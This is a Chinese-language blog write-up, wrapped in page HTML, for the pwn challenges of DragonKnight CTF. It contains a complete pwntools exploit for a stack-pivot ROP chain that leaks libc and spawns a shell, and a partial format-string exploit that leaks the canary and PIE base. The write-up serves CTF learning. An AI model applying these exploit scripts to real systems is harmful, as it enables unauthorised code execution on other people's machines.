@@ -1,0 +1,877 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="voidchunk">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="DragonKnight CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DragonKnightCTF wp">
+<meta property="og:url" content="https://voidchunk.github.io/2024/05/27/DragonKnightCTF-wp/index.html">
+<meta property="og:site_name" content="voidchunk&#39;s blog">
+<meta property="og:description" content="DragonKnight CTF">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/DragonKnightCTF-wp/stack_payload1_0.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/DragonKnightCTF-wp/stack_payload1_1.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/DragonKnightCTF-wp/stack_payload2_0.png">
+<meta property="og:image" content="https://voidchunk.github.io/img/post/DragonKnightCTF-wp/stack_payload2_1.png">
+<meta property="article:published_time" content="2024-05-27T08:55:33.000Z">
+<meta property="article:modified_time" content="2025-03-15T15:21:45.074Z">
+<meta property="article:author" content="voidchunk">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="WP">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://voidchunk.github.io/img/post/DragonKnightCTF-wp/stack_payload1_0.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>DragonKnightCTF wp - voidchunk&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"voidchunk.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>voidchunk</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="https://github.com/voidchunk" target="_self">
+                <i class="iconfont icon-github-fill"></i>
+                <span>GitHub</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="DragonKnightCTF wp"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-27 16:55" pubdate>
+          2024年5月27日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          17 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">DragonKnightCTF wp</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年3月15日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>DragonKnight CTF </p>
+<span id="more"></span>
+
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>有栈溢出点，但只有8个字节，只能刚好覆盖到ret地址，所以要进行栈迁移<br>先用vmmap看一下能够写的位置</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span><br>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA<br>             Start                End Perm     Size Offset File<br>          0x400000           0x401000 r--p     1000      0 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x401000           0x402000 r-xp     1000   1000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x402000           0x403000 r--p     1000   2000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x403000           0x404000 r--p     1000   2000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>          0x404000           0x405000 rw-p     1000   3000 /home/zzkkk1h/Desktop/contest/DragonKnight/stack/pwn<br>    0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e15000     0x7ffff7e16000 ---p     1000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6<br>    0x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]<br>    0x7ffff7fa2000     0x7ffff7fa5000 rw-p     3000      0 [anon_7ffff7fa2]<br>    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]<br>    0x7ffff7fbd000     0x7ffff7fc1000 r--p     4000      0 [vvar]<br>    0x7ffff7fc1000     0x7ffff7fc3000 r-xp     2000      0 [vdso]<br>    0x7ffff7fc3000     0x7ffff7fc5000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7fc5000     0x7ffff7fef000 r-xp    2a000   2000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7fef000     0x7ffff7ffa000 r--p     b000  2c000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  37000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffff7ffd000     0x7ffff7fff000 rw-p     2000  39000 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2<br>    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]<br>0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]<br><span class="hljs-meta prompt_">pwndbg&gt;</span><br></code></pre></td></tr></table></figure>
+<p>先以0x404500为迁移地址(记为addr)，不行再换</p>
+<p>再看看ida</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> <span class="hljs-comment">; int __fastcall main(int argc, const char **argv, const char **envp)</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span>                 <span class="hljs-meta">public</span> main<br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> main            proc <span class="hljs-built_in">near</span>               <span class="hljs-comment">; DATA XREF: _start+21↑o</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> buf             = <span class="hljs-built_in">byte</span> <span class="hljs-built_in">ptr</span> -<span class="hljs-number">100h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span> <span class="hljs-comment">; __unwind &#123;</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401176</span>                 endbr64<br><span class="hljs-symbol">.text:</span>000000000040117A                 <span class="hljs-keyword">push</span>    <span class="hljs-built_in">rbp</span><br><span class="hljs-symbol">.text:</span>000000000040117B                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rbp</span>, <span class="hljs-built_in">rsp</span><br><span class="hljs-symbol">.text:</span>000000000040117E                 <span class="hljs-keyword">sub</span>     <span class="hljs-built_in">rsp</span>, <span class="hljs-number">100h</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401185</span>                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>000000000040118A                 <span class="hljs-keyword">call</span>    inits<br><span class="hljs-symbol">.text:</span>000000000040118F                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rdi</span>, s          <span class="hljs-comment">; &quot;Hello, CTFer, do you know how to stack &quot;...</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">0000000000401196</span>                 <span class="hljs-keyword">call</span>    _puts<br><span class="hljs-symbol">.text:</span>000000000040119B                 <span class="hljs-keyword">lea</span>     <span class="hljs-built_in">rax</span>, [<span class="hljs-built_in">rbp</span>+buf]  <span class="hljs-comment">; ret时填的位置</span><br><span class="hljs-symbol">.text:</span>00000000004011A2                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edx</span>, <span class="hljs-number">110h</span>       <span class="hljs-comment">; nbytes</span><br><span class="hljs-symbol">.text:</span>00000000004011A7                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">rsi</span>, <span class="hljs-built_in">rax</span>        <span class="hljs-comment">; buf</span><br><span class="hljs-symbol">.text:</span>00000000004011AA                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">edi</span>, <span class="hljs-number">0</span>          <span class="hljs-comment">; fd</span><br><span class="hljs-symbol">.text:</span>00000000004011AF                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000004011B4                 <span class="hljs-keyword">call</span>    _read<br><span class="hljs-symbol">.text:</span>00000000004011B9                 <span class="hljs-keyword">mov</span>     <span class="hljs-built_in">eax</span>, <span class="hljs-number">0</span><br><span class="hljs-symbol">.text:</span>00000000004011BE                 <span class="hljs-keyword">leave</span><br><span class="hljs-symbol">.text:</span>00000000004011BF                 <span class="hljs-keyword">retn</span><br><span class="hljs-symbol">.text:</span>00000000004011BF <span class="hljs-comment">; &#125; // starts at 401176</span><br><span class="hljs-symbol">.text:</span>00000000004011BF main            endp<br></code></pre></td></tr></table></figure>
+
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol>
+<li>利用第一次溢出将rbp转到addr的位置，并再次调用read函数</li>
+<li>利用第二次溢出将rsp转到addr+0x10的位置，将rbp转到addr+0x100的位置</li>
+<li>此时调用read函数，写的位置就是addr的位置，之后执行call函数时会将read地址压入addr+0x8，rbp压入addr，但此时是在addr处写值，这样便有足够长的空间来构造rop链，利用此次rop链泄露puts函数地址，计算libc基址</li>
+<li>在利用main函数构造栈帧，修改rbp，调用read函数</li>
+<li>计算好偏移，利用read函数的ret来构造rop链，可以直接用one_gadget,或者system函数</li>
+</ol>
+<h4 id="第一次溢出"><a href="#第一次溢出" class="headerlink" title="第一次溢出"></a>第一次溢出</h4><p>buf数组的长度为0x100(256)，后边就是rbp和ret地址<br>先在rbp处填上addr，ret处填上read函数的位置(包括给read函数传参的指令，即0x40119B)<br>之后程序执行leave(相当于 mov rsp,rbp ; pop rbp)时，会将rbp的值填为addr</p>
+<p><img src="/img/post/DragonKnightCTF-wp/stack_payload1_0.png" srcset="/img/loading.gif" lazyload><br><img src="/img/post/DragonKnightCTF-wp/stack_payload1_1.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="第二次溢出"><a href="#第二次溢出" class="headerlink" title="第二次溢出"></a>第二次溢出</h4><p>继续调用read函数时，会从rbp+buf(即addr-0x100)处开始写值<br>执行call函数时，除了call函数中的leave ; ret<br>函数执行结束后仍有一组 leave ; ret,利用这个leave ; ret ,可以将rsp放到addr+8处，rbp放到rbp指向的位置处<br>这样就将栈迁移到了一个新的地方，并且我们知道此时栈上的一个地址addr</p>
+<p><img src="/img/post/DragonKnightCTF-wp/stack_payload2_0.png" srcset="/img/loading.gif" lazyload><br><img src="/img/post/DragonKnightCTF-wp/stack_payload2_1.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h4><p>迁移完之后，也有了伪造的栈上的地址，只要计算好偏移，使得 <code>rbp-rsp &lt;= (0x100-0x10) </code>,便可使执行read函数时能够在压入的rbp和返回地址上写值，同时要注意不能时rbp-rsp过小，从而放不下rop链</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>,<span class="hljs-string">&#x27;splitw&#x27;</span>,<span class="hljs-string">&#x27;-h&#x27;</span>]<br><br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">30347</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br>main = <span class="hljs-number">0x40117A</span><br>addr = <span class="hljs-number">0x404500</span><br>read = <span class="hljs-number">0x40119B</span><br>ret = <span class="hljs-number">0x4011BF</span><br><br>puts_plt = elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got = elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br><br>pop_rdi = <span class="hljs-number">0x401210</span> <span class="hljs-comment">#0x0000000000401210 : pop rdi ; ret</span><br>leave_ret = <span class="hljs-number">0x4011BE</span><br><br><span class="hljs-comment"># 修改rbp(为了下一次溢出将rsp修改到这里)</span><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(addr) + p64(read)<br>p.sendafter(<span class="hljs-string">b&quot;pivoting?&quot;</span>,payload1)<br><br><span class="hljs-comment"># 修改rbp和rsp(这个rsp和第一次溢出时的rbp相等，但是执行了pop和ret操作，所以会增加0x10)</span><br>payload2 = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x100</span> + p64(addr+<span class="hljs-number">0x100</span>) + p64(read)<br>p.send(payload2)<br><br><span class="hljs-comment">#gdb.attach(p)</span><br>sleep(<span class="hljs-number">0.1</span>)<br><br><span class="hljs-comment"># 此时rbp位于addr+0x100，所以调用read函数时会在addr处开始写值</span><br><span class="hljs-comment"># 同时rsp位于addr+0x10处，然后执行了call read操作，使得addr+0x8处为read函数返回地址，addr处为rbp的值</span><br><span class="hljs-comment"># 所以第一个8字节为需要rbp填上的值，后面为ret到的地方</span><br><span class="hljs-comment"># 最后用main函数而不是read函数是因为我直接用read函数会报错，目前不知道原因</span><br>payload3 = p64(addr+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x10</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)<br>p.send(payload3)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;Hello&#x27;</span>)[-<span class="hljs-number">12</span>:-<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&quot;puts_addr: &quot;</span>+<span class="hljs-built_in">hex</span>(puts_addr))<br><br>puts_offset = <span class="hljs-number">0x084420</span><br>libc_base = puts_addr - puts_offset<br>system_addr = libc_base +<span class="hljs-number">0x052290</span><br>binsh = libc_base + <span class="hljs-number">0x1b45bd</span><br>one_gadget = libc_base + <span class="hljs-number">0xe3afe</span><br><br><span class="hljs-comment"># 修改rbp为addr+0x120，此时rsp为addr+0x30，刚好相差0xf0</span><br>payload4 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x100</span>+p64(addr+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x20</span>)+p64(read)<br>p.send(payload4)<br><br>sleep(<span class="hljs-number">0.1</span>)<br><br>pop_r12 = libc_base + <span class="hljs-number">0x2f709</span><br><br><span class="hljs-comment"># 第一个8字节为rbp，此时rbp为什么值都无所谓了，反正要拿到shell了</span><br>payload5 = p64(<span class="hljs-number">0</span>) + p64(pop_r12) + p64(<span class="hljs-number">0</span>) + p64(one_gadget)   <span class="hljs-comment"># p64(0) + p64(ret)+p64(pop_rdi)+p64(binsh)+p64(system_addr)</span><br>p.send(payload5)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h2 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>漏洞点在gift函数中，有一个格式化字符串漏洞和栈溢出漏洞<br>想要程序运行到gift函数中需要小小逆向一下，逆向不难，token是按位取反后base32加密与encode_token对比<br>后边有个算术题，要注意一下用eval时c和python关于%运算符的处理稍有不同，可以特殊处理使得python的运算结果和c相同，但没必要，多运行几次就行了<br>之后利用格式化字符串漏洞泄露canary、main的rbp(用于计算bihsh的偏移)、以及ret地址(用于计算pie)</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> base64<br><br>encode_token = <span class="hljs-string">&quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&quot;</span><br>token = base64.b32decode(encode_token.encode())<br><br>token = <span class="hljs-built_in">list</span>(token)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(token)):<br>    token[i] = ~token[i]<br>    token[i] = <span class="hljs-built_in">chr</span>(token[i]&amp;<span class="hljs-number">0xFF</span>)<br><br>token = <span class="hljs-string">&quot;&quot;</span>.join(token).encode()<br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-comment">#p = process(&quot;./attachment&quot;)</span><br>p = remote(<span class="hljs-string">&quot;challenge.qsnctf.com&quot;</span>,<span class="hljs-number">30087</span>)<br>elf = ELF(<span class="hljs-string">&quot;./attachment&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Please give me your token: &#x27;</span>)<br>p.sendline(token)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Right!\n&#x27;</span>)<br>math = p.recvline()<br>math = math.decode()[:-<span class="hljs-number">3</span>]<br>math_res = <span class="hljs-built_in">eval</span>(math)<br>p.sendline(<span class="hljs-built_in">str</span>(math_res).encode())<br>p.recvline(<span class="hljs-string">b&#x27;gift:\n&#x27;</span>)<br><br>payload1 = <span class="hljs-string">b&#x27;%11$p&#x27;</span>+ <span class="hljs-string">b&#x27;%12$p&#x27;</span>+<span class="hljs-string">b&#x27;%13$p&#x27;</span> + <span class="hljs-string">b&#x27;x&#x27;</span> + <span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span><br>p.sendline(payload1)<br>data = p.recv()<br><span class="hljs-built_in">print</span>(data)<br>data = data.split(<span class="hljs-string">b&#x27;x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;0x&#x27;</span>+data[<span class="hljs-number">1</span>][:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>main_rbp = <span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;0x&#x27;</span>+data[<span class="hljs-number">2</span>][:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)<br>main_2042_addr  =<span class="hljs-built_in">int</span>(<span class="hljs-string">b&#x27;0x&#x27;</span>+data[<span class="hljs-number">3</span>],<span class="hljs-number">16</span>)<br>rsp_addr = main_rbp - <span class="hljs-number">0x1e0</span> <br>binsh = rsp_addr + <span class="hljs-number">0x10</span><br>pie = main_2042_addr - <span 